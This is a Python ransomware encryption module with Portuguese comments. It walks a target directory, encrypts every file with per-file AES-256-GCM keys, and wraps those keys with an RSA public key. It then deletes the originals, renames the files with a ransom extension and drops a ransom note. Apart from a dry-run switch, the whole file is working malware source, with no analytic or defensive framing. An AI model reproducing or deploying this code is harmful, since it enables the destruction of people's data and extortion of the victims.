# language: Python 3.10+, file: encrypter.py
# Cifra todos os arquivos do diretório alvo com AES-256-GCM,
# envolve cada chave AES com RSA-2048-OAEP, apaga os originais.
import os
import secrets
from concurrent.futures import ThreadPoolExecutor, as_completed

from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

from config import (
    TARGET_DIR, RANSOM_EXT, NOTE_NAME, NOTE_TEMPLATE,
    DRY_RUN, SKIP_DIR_NAMES, SKIP_EXTENSIONS, MAX_WORKERS, BASE,
)

# Layout do arquivo cifrado:
#   [nonce 12B][wrapped_key 256B][ciphertext + tag GCM 16B]
NONCE_SIZE = 12
WRAPPED_KEY_SIZE = 256  # RSA-2048

with open(os.path.join(BASE, "public_key.pem"), "rb") as f:
    PUBLIC_KEY = serialization.load_pem_public_key(f.read())


def encrypt_file(path: str) -> None:
    with open(path, "rb") as f:
        plaintext = f.read()

    # 1. Chave AES aleatória por arquivo — não reutilize
    aes_key = secrets.token_bytes(32)            # AES-256

    # 2. Nonce aleatório por arquivo — GCM nunca reusa
    nonce = secrets.token_bytes(NONCE_SIZE)

    # 3. Cifra autenticada. ciphertext inclui o tag no final
    ciphertext = AESGCM(aes_key).encrypt(nonce, plaintext, None)

    # 4. Envolve a chave AES com RSA-OAEP-SHA256
    wrapped_key = PUBLIC_KEY.encrypt(
        aes_key,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None,
        ),
    )

    blob = nonce + wrapped_key + ciphertext
    new_path = path + RANSOM_EXT

    if DRY_RUN:
        print(f"[dry-run] {path} -> {new_path}  ({len(plaintext)} B)")
        return

    with open(new_path, "wb") as f:
        f.write(blob)
    os.remove(path)


def collect_targets(root: str) -> list[str]:
    targets = []
    for dirpath, dirnames, filenames in os.walk(root):
        dirnames[:] = [d for d in dirnames if d not in SKIP_DIR_NAMES]
        for name in filenames:
            ext = os.path.splitext(name)[1].lower()
            if ext in SKIP_EXTENSIONS or name.endswith(RANSOM_EXT):
                continue
            targets.append(os.path.join(dirpath, name))
    return targets


def drop_note(root: str) -> None:
    if DRY_RUN:
        print(f"[dry-run] deixaria {NOTE_NAME} em {root}")
        return
    with open(os.path.join(root, NOTE_NAME), "w", encoding="utf-8") as f:
        f.write(NOTE_TEMPLATE)


def run() -> None:
    targets = collect_targets(TARGET_DIR)
    print(f"[*] alvo: {TARGET_DIR}")
    print(f"[*] {len(targets)} arquivo(s) na fila | workers={MAX_WORKERS}")

    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as pool:
        futures = {pool.submit(encrypt_file, p): p for p in targets}
        for fut in as_completed(futures):
            try:
                fut.result()
            except Exception as e:
                print(f"[!] {futures[fut]}: {e}")

    drop_note(TARGET_DIR)
    print("[*] concluído")


if __name__ == "__main__":
    run()